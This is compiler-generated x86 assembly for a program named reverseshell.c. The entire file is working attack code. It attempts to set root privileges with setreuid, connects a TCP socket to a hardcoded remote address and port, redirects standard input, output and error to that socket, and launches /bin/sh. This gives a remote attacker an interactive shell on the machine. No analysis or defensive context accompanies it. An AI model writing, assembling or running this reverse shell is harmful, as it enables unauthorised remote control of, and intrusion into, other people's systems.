	.file	"reverseshell.c"
	.section	.rodata
.LC0:
	.string	"/bin/sh"
	.text
.globl main
	.type	main, @function
main:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$12, %esp
	movl	$0, 4(%esp)
	movl	$0, (%esp)
	call	setreuid
	movw	$2, serv_addr
	movl	$620865728, serv_addr+4
	movw	$-21846, serv_addr+2
	movl	$6, 8(%esp)
	movl	$1, 4(%esp)
	movl	$2, (%esp)
	call	socket
	movl	%eax, soc
	movl	$serv_addr, %eax
	movl	soc, %edx
	movl	$16, 8(%esp)
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	connect
	movl	%eax, rc
	movl	soc, %eax
	movl	$0, 4(%esp)
	movl	%eax, (%esp)
	call	dup2
	movl	soc, %eax
	movl	$1, 4(%esp)
	movl	%eax, (%esp)
	call	dup2
	movl	soc, %eax
	movl	$2, 4(%esp)
	movl	%eax, (%esp)
	call	dup2
	movl	$0, 8(%esp)
	movl	$0, 4(%esp)
	movl	$.LC0, (%esp)
	call	execle
	leave
	ret
	.size	main, .-main
	.comm	soc,4,4
	.comm	rc,4,4
	.comm	serv_addr,16,4
	.ident	"GCC: (GNU) 4.2.1 (SUSE Linux)"
	.section	.note.GNU-stack,"",@progbits
